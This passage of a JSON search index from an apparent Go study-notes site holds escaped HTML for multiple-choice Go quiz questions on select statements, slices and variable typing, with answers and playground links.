style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ech1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003echan\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ech2\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003echan\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003ech1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eselect\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ech1\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ech2\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ech2\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. 1\u003c/li\u003e\n\u003cli\u003eB. 2\u003c/li\u003e\n\u003cli\u003eC. No output, program is deadlocked\u003c/li\u003e\n\u003cli\u003eD. No output, program has finished execution.\u003c/li\u003e\n\u003cli\u003eE. else\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/lPURBGXle_N\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eB\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Select"},{"categories":null,"contents":" slice package main import ( \u0026#34;fmt\u0026#34; ) func main() { var s1 []int var s2 = []int{} if __ == nil { fmt.Println(\u0026#34;nil slice\u0026#34;) } if __ != nil { fmt.Println(\u0026#34;empty slice\u0026#34;) } } A. s1, s2 B. s2, s1 C. s1, s1 D. s2, s2 Answer Try it A slice1 package main import ( \u0026#34;fmt\u0026#34; ) func main() { s := [3]int{1, 2, 3} a := s[:0] b := s[:2] c := s[1:2:cap(s)] fmt.Println(len(a), cap(a)) fmt.Println(len(b), cap(b)) fmt.Println(len(c), cap(c)) } Answer Try it 0 3 2 3 1 2 slice2 package main import \u0026#34;fmt\u0026#34; func main() { s1 := []int{1, 2, 3} s2 := s1[1:] s2[1] = 4 fmt.Println(s1) s2 = append(s2, 5, 6, 7) fmt.Println(s1) } Answer Try it [1 2 4] [1 2 4] ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/questions/slice/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eslice\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es1\u003c/span\u003e []\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es2\u003c/span\u003e = []\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003e__\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nil slice\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003e__\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;empty slice\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. s1, s2\u003c/li\u003e\n\u003cli\u003eB. s2, s1\u003c/li\u003e\n\u003cli\u003eC. s1, s1\u003c/li\u003e\n\u003cli\u003eD. s2, s2\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/S_Q4w6NMAoU\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eA\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eslice1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e [\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e[:\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e[:\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e:cap(\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e)]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(len(\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e), cap(\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(len(\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e), cap(\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(len(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e), cap(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/hpZ3VyWv-Pz\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e0 3\n2 3\n1 2\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eslice2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003es1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e []\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003es2\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es1\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e:]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003es2\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e] = \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003es1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003es2\u003c/span\u003e = append(\u003cspan style=\"color:#a6e22e\"\u003es2\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003es1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/H-1Jf-LwUg4\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e[1 2 4]\n[1 2 4]\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Slice"},{"categories":null,"contents":" variable A. p.name B. (\u0026amp;p).name C. (*p).name D. p-\u0026gt;name Answer AC variable1 package main import ( \u0026#34;fmt\u0026#34; ) func main() { var ans float64 = 15 + 25 + 5.2 fmt.Println(ans) } A. 45 B. 45.0 C. 45.2 D. compliation error Answer Try it C variable2 package main import ( \u0026#34;fmt\u0026#34; ) func main() { var ans float64 = 3 / 2 fmt.Println(ans) } A. 1.5 B. 1 C. 0 D. compliation error Answer Try it B variable3 package main func main() { const a int8 = -1 var b int8 = -128 / a println(b) } Answer Try it compliation error -128 / a (constant 128 of type int8) overflows int8 variable4 package main func main() { var a int8 = -1 var b int8 = -128 / a println(b) } Answer Try it -128 variable5 package main import \u0026#34;fmt\u0026#34; type MyInt1 int type MyInt2 = int func main() { var i int =0 var i1 MyInt1 = i var i2 MyInt2 = i fmt.Println(i1, i2) } Answer Try it compilation error cannot use i (variable of type int) as MyInt1 value in variable declaration variable6 package main import \u0026#34;fmt\u0026#34; func main() { const X = 7.0 var x interface{} = X if y, ok := x.(int); ok { fmt.Println(y) } else { fmt.Println(int(y)) } } A. 7 B. 7.0 C. 0 D. compilation error Answer Try it C ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/questions/variable/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evariable\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003eA. p.name\u003c/li\u003e\n\u003cli\u003eB. (\u0026amp;p).name\u003c/li\u003e\n\u003cli\u003eC. (*p).name\u003c/li\u003e\n\u003cli\u003eD. p-\u0026gt;name\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\n\u003ccode\u003eAC\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evariable1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eans\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efloat64\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e25\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e5.2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eans\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. 45\u003c/li\u003e\n\u003cli\u003eB. 45.0\u003c/li\u003e\n\u003cli\u003eC. 45.2\u003c/li\u003e\n\u003cli\u003eD. compliation error\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/VCR1yAY32nG\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eC\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evariable2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eans\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efloat64\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eans\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. 1.5\u003c/li\u003e\n\u003cli\u003eB. 1\u003c/li\u003e\n\u003cli\u003eC. 0\u003c/li\u003e\n\u003cli\u003eD. 